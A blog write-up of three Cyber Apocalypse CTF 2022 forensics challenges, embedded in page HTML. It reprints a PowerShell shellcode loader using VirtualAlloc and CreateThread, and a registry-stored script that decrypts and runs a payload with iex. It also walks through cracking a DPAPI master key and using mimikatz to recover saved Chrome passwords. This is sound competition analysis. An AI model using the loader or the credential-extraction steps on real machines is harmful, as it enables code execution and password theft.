@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Cyber Apocalypse CTF 2022 | Luhko</title>
+<meta name="keywords" content="">
+<meta name="description" content="Forensics Pupeteer We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :
+ Powershell Powershell Operational Powershell Admin (empty)  In the powershell logs, there is nothing really interesting but a suspicious filename special_orders.ps1.
+In the Powershell Operational, we can find this suspicious script (regarding the variables name) :">
+<meta name="author" content="">
+<link rel="canonical" href="https://luhko.github.io/write-up/cyber2022/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.41f2d211c00e636a3c229c52ef2d4299a66891ae66771098993b13bca7972ae6.css" integrity="sha256-QfLSEcAOY2o8IpxS7y1CmaZoka5mdxCYmTsTvKeXKuY=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://luhko.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://luhko.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://luhko.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://luhko.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://luhko.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Cyber Apocalypse CTF 2022" />
+<meta property="og:description" content="Forensics Pupeteer We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :
+ Powershell Powershell Operational Powershell Admin (empty)  In the powershell logs, there is nothing really interesting but a suspicious filename special_orders.ps1.
+In the Powershell Operational, we can find this suspicious script (regarding the variables name) :" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://luhko.github.io/write-up/cyber2022/" /><meta property="article:section" content="write-up" />
+<meta property="article:published_time" content="2022-05-19T23:44:49&#43;02:00" />
+<meta property="article:modified_time" content="2022-05-19T23:44:49&#43;02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cyber Apocalypse CTF 2022"/>
+<meta name="twitter:description" content="Forensics Pupeteer We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :
+ Powershell Powershell Operational Powershell Admin (empty)  In the powershell logs, there is nothing really interesting but a suspicious filename special_orders.ps1.
+In the Powershell Operational, we can find this suspicious script (regarding the variables name) :"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Cyber Apocalypse CTF 2022",
+      "item": "https://luhko.github.io/write-up/cyber2022/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Cyber Apocalypse CTF 2022",
+  "name": "Cyber Apocalypse CTF 2022",
+  "description": "Forensics Pupeteer We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :\n Powershell Powershell Operational Powershell Admin (empty)  In the powershell logs, there is nothing really interesting but a suspicious filename special_orders.ps1.\nIn the Powershell Operational, we can find this suspicious script (regarding the variables name) :",
+  "keywords": [
+    
+  ],
+  "articleBody": "Forensics Pupeteer We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :\n Powershell Powershell Operational Powershell Admin (empty)  In the powershell logs, there is nothing really interesting but a suspicious filename special_orders.ps1.\nIn the Powershell Operational, we can find this suspicious script (regarding the variables name) :\n$OleSPrlmhB = @\" [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); \"@ [byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3; [byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1; $tNZvQCljVk = Add-Type -memberDefinition $OleSPrlmhB -Name \"Win32\" -namespace Win32Functions -passthru; [Byte[]] $HVOASfFuNSxRXR = 0x2d,0x99,0x52,0x35,0x21,0x39,0x1d,0xd1,0xd1,0xd1,0x90,0x80,0x90,0x81,0x83,0x99,0xe0,0x03,0xb4,0x99,0x5a,0x83,0xb1,0x99,0x5a,0x83,0xc9,0x80,0x87,0x99,0x5a,0x83,0xf1,0x99,0xde,0x66,0x9b,0x9b,0x9c,0xe0,0x18,0x99,0x5a,0xa3,0x81,0x99,0xe0,0x11,0x7d,0xed,0xb0,0xad,0xd3,0xfd,0xf1,0x90,0x10,0x18,0xdc,0x90,0xd0,0x10,0x33,0x3c,0x83,0x99,0x5a,0x83,0xf1,0x90,0x80,0x5a,0x93,0xed,0x99,0xd0,0x01,0xb7,0x50,0xa9,0xc9,0xda,0xd3,0xde,0x54,0xa3,0xd1,0xd1,0xd1,0x5a,0x51,0x59,0xd1,0xd1,0xd1,0x99,0x54,0x11,0xa5,0xb6,0x99,0xd0,0x01,0x5a,0x99,0xc9,0x81,0x95,0x5a,0x91,0xf1,0x98,0xd0,0x01,0x32,0x87,0x99,0x2e,0x18,0x9c,0xe0,0x18,0x90,0x5a,0xe5,0x59,0x99,0xd0,0x07,0x99,0xe0,0x11,0x90,0x10,0x18,0xdc,0x7d,0x90,0xd0,0x10,0xe9,0x31,0xa4,0x20,0x9d,0xd2,0x9d,0xf5,0xd9,0x94,0xe8,0x00,0xa4,0x09,0x89,0x95,0x5a,0x91,0xf5,0x98,0xd0,0x01,0xb7,0x90,0x5a,0xdd,0x99,0x95,0x5a,0x91,0xcd,0x98,0xd0,0x01,0x90,0x5a,0xd5,0x59,0x90,0x89,0x90,0x89,0x8f,0x88,0x99,0xd0,0x01,0x8b,0x90,0x89,0x90,0x88,0x90,0x8b,0x99,0x52,0x3d,0xf1,0x90,0x83,0x2e,0x31,0x89,0x90,0x88,0x8b,0x99,0x5a,0xc3,0x38,0x9a,0x2e,0x2e,0x2e,0x8c,0x98,0x6f,0xa6,0xa2,0xe3,0x8e,0xe2,0xe3,0xd1,0xd1,0x90,0x87,0x98,0x58,0x37,0x99,0x50,0x3d,0x71,0xd0,0xd1,0xd1,0x98,0x58,0x34,0x98,0x6d,0xd3,0xd1,0xd4,0xe8,0x11,0x79,0xd1,0xc3,0x90,0x85,0x98,0x58,0x35,0x9d,0x58,0x20,0x90,0x6b,0x9d,0xa6,0xf7,0xd6,0x2e,0x04,0x9d,0x58,0x3b,0xb9,0xd0,0xd0,0xd1,0xd1,0x88,0x90,0x6b,0xf8,0x51,0xba,0xd1,0x2e,0x04,0xbb,0xdb,0x90,0x8f,0x81,0x81,0x9c,0xe0,0x18,0x9c,0xe0,0x11,0x99,0x2e,0x11,0x99,0x58,0x13,0x99,0x2e,0x11,0x99,0x58,0x10,0x90,0x6b,0x3b,0xde,0x0e,0x31,0x2e,0x04,0x99,0x58,0x16,0xbb,0xc1,0x90,0x89,0x9d,0x58,0x33,0x99,0x58,0x28,0x90,0x6b,0x48,0x74,0xa5,0xb0,0x2e,0x04,0x54,0x11,0xa5,0xdb,0x98,0x2e,0x1f,0xa4,0x34,0x39,0x42,0xd1,0xd1,0xd1,0x99,0x52,0x3d,0xc1,0x99,0x58,0x33,0x9c,0xe0,0x18,0xbb,0xd5,0x90,0x89,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xaf,0x84,0x99,0x52,0x15,0xf1,0x8f,0x58,0x27,0xbb,0x91,0x90,0x88,0xb9,0xd1,0xc1,0xd1,0xd1,0x90,0x89,0x99,0x58,0x23,0x99,0xe0,0x18,0x90,0x6b,0x89,0x75,0x82,0x34,0x2e,0x04,0x99,0x58,0x12,0x98,0x58,0x16,0x9c,0xe0,0x18,0x98,0x58,0x21,0x99,0x58,0x0b,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xac,0xf9,0x89,0x90,0x86,0x88,0xb9,0xd1,0x91,0xd1,0xd1,0x90,0x89,0xbb,0xd1,0x8b,0x90,0x6b,0xda,0xfe,0xde,0xe1,0x2e,0x04,0x86,0x88,0x90,0x6b,0xa4,0xbf,0x9c,0xb0,0x2e,0x04,0x98,0x2e,0x1f,0x38,0xed,0x2e,0x2e,0x2e,0x99,0xd0,0x12,0x99,0xf8,0x17,0x99,0x54,0x27,0xa4,0x65,0x90,0x2e,0x36,0x89,0xbb,0xd1,0x88,0x98,0x16,0x13,0x21,0x64,0x73,0x87,0x2e,0x04; [array]::Reverse($stage2); $hRffYLENA = $tNZvQCljVk::VirtualAlloc(0,[Math]::Max($HVOASfFuNSxRXR.Length,0x1000),0x3000,0x40); $stage3 = $stage1 + $stage2; [System.Runtime.InteropServices.Marshal]::Copy($HVOASfFuNSxRXR,0,$hRffYLENA,$HVOASfFuNSxRXR.Length); # Unpack Shellcode; for($i=0; $i -lt $HVOASfFuNSxRXR.count ; $i++) { $HVOASfFuNSxRXR[$i] = $HVOASfFuNSxRXR[$i] -bxor 0xd1; } #Unpack Special Orders! for($i=0;$i -lt $stage3.count;$i++){ $stage3[$i] = $stage3[$i] -bxor 0xd1; } $tNZvQCljVk::CreateThread(0,0,$hRffYLENA,0,0,0); If we execute it, there is nothing printed and the powershell window is closing. I tried to print $stage3 (and I removed the last line to prevent the window closing), which is giving me the following output :\n$ .\\script.ps1 72 84 66 123 98 51 119 104 52 114 51 95 48 102 95 116 104 51 95 98 48 48 116 53 95 48 102 95 106 117 115 116 49 99 51 46 46 46 125 This looks like a decimal ASCII chain. After decoding it (decimal → ascii), I got the flag !\nGolden Persistence We have a NTUSER.DAT file. This file is used as a hive file (HKEY_CURRENT_USER) in Windows systems. We can navigate in it with Registry Explorer.\nRegarding the challenge description, we know that it is about persistence. Usually, persistence stuff are located in HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nAfter navigating to the key, we can find the following value, which is highly suspicious :\nWe can use this tool to decrypt the payload :\nfunction encr { param( [Byte[]]$data, [Byte[]]$key ) [Byte[]]$buffer = New-Object Byte[] $data.Length $data.CopyTo($buffer, 0) [Byte[]]$s = New-Object Byte[] 256; [Byte[]]$k = New-Object Byte[] 256; for ($i = 0; $i -lt 256; $i++) { $s[$i] = [Byte]$i; $k[$i] = $key[$i % $key.Length]; } $j = 0; for ($i = 0; $i -lt 256; $i++) { $j = ($j + $s[$i] + $k[$i]) % 256; $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp; } $i = $j = 0; for ($x = 0; $x -lt $buffer.Length; $x++) { $i = ($i + 1) % 256; $j = ($j + $s[$i]) % 256; $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp; [int]$t = ($s[$i] + $s[$j]) % 256; $buffer[$x] = $buffer[$x] -bxor $s[$t]; } return $buffer } function HexToBin { param( [Parameter( Position=0, Mandatory=$true, ValueFromPipeline=$true) ] [string]$s) $return = @() for ($i = 0; $i -lt $s.Length ; $i += 2) { $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber) } Write-Output $return } [Byte[]]$key = $enc.GetBytes(\"Q0mmpr4B5rvZi3pS\") $encrypted1 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\ZYb78P4s).t3RBka5tL $encrypted2 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\BjqAtIen).uLltjjW $encrypted3 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\AppDataLow\\t03A1Stq).uY4S39Da $encrypted4 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\Google\\Nv50zeG).Kb19fyhl $encrypted5 = (Get-ItemProperty -Path HKCU:\\AppEvents\\Jx66ZG0O).jH54NW8C $encrypted = \"$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)\" $enc = [System.Text.Encoding]::ASCII [Byte[]]$data = HexToBin $encrypted $DecryptedBytes = encr $data $key $DecryptedString = $enc.GetString($DecryptedBytes) $DecryptedString|iex The things that we need to do are:\n Extract the value of $encrypted1..5 in the registry ; and replace it in the script Replace $enc declaration before $key declaration  Final script :\n... $enc = [System.Text.Encoding]::ASCII [Byte[]]$key = $enc.GetBytes(\"Q0mmpr4B5rvZi3pS\") $encrypted1 = \"F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39\" $encrypted2 = \"CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1\" $encrypted3 = \"C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D\" $encrypted4 = \"D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1\" $encrypted5 = \"84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB\" $encrypted = \"$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)\" [Byte[]]$data = HexToBin $encrypted $DecryptedBytes = encr $data $key $DecryptedString = $enc.GetString($DecryptedBytes) $DecryptedString|iex Then we execute it :\n$ ./script.ps1 ... $flag=\"HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}\" Seized This challenge is about finding ransomware operators credentials in the AppData folder :\nAfter some researches about potential interesting location, I found the Google one. This folder contains data about Google Chrome and 2 particular files are interesting :\n AppData\\Local\\Google\\Chrome\\User Data\\Local State  Contains the key that encrypts the user’s passwords. This key is encrypted with the Master Key from the system, generated from various parameters, including the user’s password.   AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data  This file is a database that contains login information : website, login, password. Passwords may (or not) be encrypted. In our case, there is the login ransomoperator@draeglocker.com and the associated password is encrypted.    Let’s find out if we can find the master key file. It should be located in AppData\\Roaming\\Microsoft\\Protect\\{SID} :\n$Get-ChildItem -Hidden AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3702016591-3723034727-1691771208-1002\\ Répertoire: AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3702016591-3723034727-1691771208-1002 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 22/03/2022 15:06 468 865be7a6-863c-4d73-ac9f-233f8734089d -a-hs- 22/03/2022 15:06 24 Preferred There is a master key file. Since it is encrypted, we need to decrypt it to extract the master key. The first thing to do is to convert the data to a crackable format :\n$ python DPAPImk2john.py -mk 865be7a6-863c-4d73-ac9f-233f8734089d -S S-1-5-21-3702016591-3723034727-1691771208-1002 -c local $DPAPImk$2*1*S-1-5-21-3702016591-3723034727-1691771208-1002*aes256*sha512*8000*a17612a0ebdfc203316e0c18c04729f1*288*7dd629ab5efc8442596e5fbe5b9fc695bf8a51384dfacabd7a1a214245f894383540eb3e00c009bd76f836ae991cef540d74c0a6a31527b7e1df4b0d55a6760e41271f3dcaad163a6fb648f898281424728485335676c0374735cab055088e66bc55a72fc2087d64038d1d716f5efd4bdd4ce19971d082db004a36de70c351a2bd9b6ba9cf8f89a7481150b26f5808bc Let’s give our hash to john :\nroot@jtr:/hashes# ../jtr/run/john dump --wordlist=rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (DPAPImk, DPAPI masterkey file v1 and v2 [SHA1/MD4 PBKDF2-(SHA1/SHA512)-DPAPI-variant 3DES/AES256 256/256 AVX2 8x]) Cost 1 (iteration count) is 8000 for all loaded hashes Will run 16 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ransom (?) 1g 0:00:00:05 DONE (2022-05-18 17:17) 0.1692g/s 5457p/s 5457c/s 5457C/s 210392..bheibhie Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Bingo ! We got the password ransom\nNow, we want to decrypt the master key using the holy mimikatz :\nmimikatz # dpapi::masterkey /in:\"AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3702016591-3723034727-1691771208-1002\\865be7a6-863c-4d73-ac9f-233f8734089d\" /sid:S-1-5-21-3702016591-3723034727-1691771208-1002 /password:ransom /protected **MASTERKEYS** dwVersion : 00000002 - 2 szGuid : {865be7a6-863c-4d73-ac9f-233f8734089d} dwFlags : 00000005 - 5 dwMasterKeyLen : 000000b0 - 176 dwBackupKeyLen : 00000090 - 144 dwCredHistLen : 00000014 - 20 dwDomainKeyLen : 00000000 - 0 [masterkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : a17612a0ebdfc203316e0c18c04729f1 rounds : 00001f40 - 8000 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : 7dd629ab5efc8442596e5fbe5b9fc695bf8a51384dfacabd7a1a214245f894383540eb3e00c009bd76f836ae991cef540d74c0a6a31527b7e1df4b0d55a6760e41271f3dcaad163a6fb648f898281424728485335676c0374735cab055088e66bc55a72fc2087d64038d1d716f5efd4bdd4ce19971d082db004a36de70c351a2bd9b6ba9cf8f89a7481150b26f5808bc [backupkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 9e4ad8f433383f8543cdc7f97d94cc46 rounds : 00001f40 - 8000 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : 32bafd010af552fd03f566b9e411cc6ef7860c8e33c4feca3cc3c7fe2e87e09bb477111b88a1930650c8c0a10ea1f9314435bca867b3f905127d563009c8f43ed9def056ac533e51f8aa90104d98ad591a156dffe6776c53ffd4df22cd639c83162396244aff646226e14681dddbf749 [credhist] **CREDHIST INFO** dwVersion : 00000003 - 3 guid : {a2a87803-e77b-44b9-8ca2-01526cb531e4} [masterkey] with password: ransom (protected user) key : 138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630 sha1: a765463192eb14812650e62d6b0150a262d1864e Then we can use the master key to decrypt the password and get the flag !\nmimikatz # dpapi::chrome /in:\"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect /masterkey:138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630  Encrypted Key found in local state file  Encrypted Key seems to be protected by DPAPI * using CryptUnprotectData API * masterkey : 138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630  AES Key is: 46befddb52a607c5e775b7a930b6b6c4f3a35e7c1c30aaa4ce0d2277fbca6c19 URL : https://windowsliveupdater.com/ ( https://windowsliveupdater.com/ ) Username: ransomoperator@draeglocker.com * using BCrypt with AES-256-GCM Password: HTB{Br0ws3rs_C4nt_s4v3_y0u_n0w} Related sources https://www.alertra.com/blog/decrypting-browser-passwords-other-secrets\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords\nhttps://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf\nhttps://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++\n",
+  "wordCount" : "1150",
+  "inLanguage": "en",
+  "datePublished": "2022-05-19T23:44:49+02:00",
+  "dateModified": "2022-05-19T23:44:49+02:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://luhko.github.io/write-up/cyber2022/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Luhko",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://luhko.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://luhko.github.io/" accesskey="h" title="Luhko (Alt + H)">Luhko</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://luhko.github.io/articles" title="Articles">
+                    <span>Articles</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://luhko.github.io/write-up" title="Write-Up">
+                    <span>Write-Up</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://luhko.github.io/">Home</a></div>
+    <h1 class="post-title">
+      Cyber Apocalypse CTF 2022
+    </h1>
+    <div class="post-meta"><span title='2022-05-19 23:44:49 +0200 CEST'>May 19, 2022</span>&nbsp;·&nbsp;6 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#forensics" aria-label="Forensics">Forensics</a><ul>
+                        
+                <li>
+                    <a href="#pupeteer" aria-label="Pupeteer">Pupeteer</a></li>
+                <li>
+                    <a href="#golden-persistence" aria-label="Golden Persistence">Golden Persistence</a></li>
+                <li>
+                    <a href="#seized" aria-label="Seized">Seized</a><ul>
+                        
+                <li>
+                    <a href="#related-sources" aria-label="Related sources">Related sources</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="forensics">Forensics<a hidden class="anchor" aria-hidden="true" href="#forensics">#</a></h1>
+<h2 id="pupeteer">Pupeteer<a hidden class="anchor" aria-hidden="true" href="#pupeteer">#</a></h2>
+<p>We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :</p>
+<ul>
+<li>Powershell</li>
+<li>Powershell Operational</li>
+<li>Powershell Admin <strong>(empty)</strong></li>
+</ul>
+<p>In the powershell logs, there is nothing really interesting but a suspicious filename <code>special_orders.ps1</code>.</p>
+<p>In the Powershell Operational, we can find this suspicious script (regarding the variables name) :</p>
+<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="err">$</span><span class="n">OleSPrlmhB</span> <span class="p">=</span> <span class="s">@&#34;
+</span><span class="s">[DllImport(&#34;</span><span class="n">kernel32</span><span class="p">.</span><span class="n">dll</span><span class="s">&#34;)]
+</span><span class="s"></span><span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwSize</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flProtect</span><span class="p">);</span>
+<span class="na">[DllImport(&#34;kernel32.dll&#34;)]</span>
+<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="n">CreateThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadId</span><span class="p">);</span>
+<span class="s">&#34;@
+</span><span class="s"></span><span class="na">
+</span><span class="na">[byte[]</span><span class="p">]</span> <span class="err">$</span><span class="n">stage1</span> <span class="p">=</span> <span class="m">0</span><span class="n">x99</span><span class="p">,</span> <span class="m">0</span><span class="n">x85</span><span class="p">,</span> <span class="m">0</span><span class="n">x93</span><span class="p">,</span> <span class="m">0</span><span class="n">xaa</span><span class="p">,</span> <span class="m">0</span><span class="n">xb3</span><span class="p">,</span> <span class="m">0</span><span class="n">xe2</span><span class="p">,</span> <span class="m">0</span><span class="n">xa6</span><span class="p">,</span> <span class="m">0</span><span class="n">xb9</span><span class="p">,</span> <span class="m">0</span><span class="n">xe5</span><span class="p">,</span> <span class="m">0</span><span class="n">xa3</span><span class="p">,</span> <span class="m">0</span><span class="n">xe2</span><span class="p">,</span> <span class="m">0</span><span class="n">x8e</span><span class="p">,</span> <span class="m">0</span><span class="n">xe1</span><span class="p">,</span> <span class="m">0</span><span class="n">xb7</span><span class="p">,</span> <span class="m">0</span><span class="n">x8e</span><span class="p">,</span> <span class="m">0</span><span class="n">xa5</span><span class="p">,</span> <span class="m">0</span><span class="n">xb9</span><span class="p">,</span> <span class="m">0</span><span class="n">xe2</span><span class="p">,</span> <span class="m">0</span><span class="n">x8e</span><span class="p">,</span> <span class="m">0</span><span class="n">xb3</span><span class="p">;</span>
+<span class="na">[byte[]</span><span class="p">]</span> <span class="err">$</span><span class="n">stage2</span> <span class="p">=</span> <span class="m">0</span><span class="n">xac</span><span class="p">,</span> <span class="m">0</span><span class="n">xff</span><span class="p">,</span> <span class="m">0</span><span class="n">xff</span><span class="p">,</span> <span class="m">0</span><span class="n">xff</span><span class="p">,</span> <span class="m">0</span><span class="n">xe2</span><span class="p">,</span> <span class="m">0</span><span class="n">xb2</span><span class="p">,</span> <span class="m">0</span><span class="n">xe0</span><span class="p">,</span> <span class="m">0</span><span class="n">xa5</span><span class="p">,</span> <span class="m">0</span><span class="n">xa2</span><span class="p">,</span> <span class="m">0</span><span class="n">xa4</span><span class="p">,</span> <span class="m">0</span><span class="n">xbb</span><span class="p">,</span> <span class="m">0</span><span class="n">x8e</span><span class="p">,</span> <span class="m">0</span><span class="n">xb7</span><span class="p">,</span> <span class="m">0</span><span class="n">xe1</span><span class="p">,</span> <span class="m">0</span><span class="n">x8e</span><span class="p">,</span> <span class="m">0</span><span class="n">xe4</span><span class="p">,</span> <span class="m">0</span><span class="n">xa5</span><span class="p">,</span> <span class="m">0</span><span class="n">xe1</span><span class="p">,</span> <span class="m">0</span><span class="n">xe1</span><span class="p">;</span>
+
